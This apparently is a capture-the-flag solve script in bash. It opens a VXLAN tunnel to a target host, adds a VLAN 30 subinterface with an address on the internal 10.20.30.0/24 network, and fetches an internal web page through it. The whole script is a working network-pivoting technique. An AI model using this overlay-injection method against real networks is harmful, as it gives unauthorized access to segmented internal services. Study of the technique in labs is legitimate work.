#!/usr/bin/env bash
set -Eeuo pipefail
TARGET_IP="${1:?Usage: $0 <challenge-ip>}"; OUT_IF="$(ip route get "$TARGET_IP"|awk '{for(i=1;i<=NF;i++)if($i=="dev"){print $(i+1);exit}}')"
ip link delete vxlan200.30 2>/dev/null||true; ip link delete vxlan200 2>/dev/null||true
ip link add vxlan200 type vxlan id 200 remote "$TARGET_IP" dstport 4789 dev "$OUT_IF"; ip link set vxlan200 up; dhclient -1 vxlan200
ip link add link vxlan200 name vxlan200.30 type vlan id 30; ip link set vxlan200.30 up; ip addr add 10.20.30.50/24 dev vxlan200.30
curl --interface vxlan200.30 -fsS http://10.20.30.10:8080/
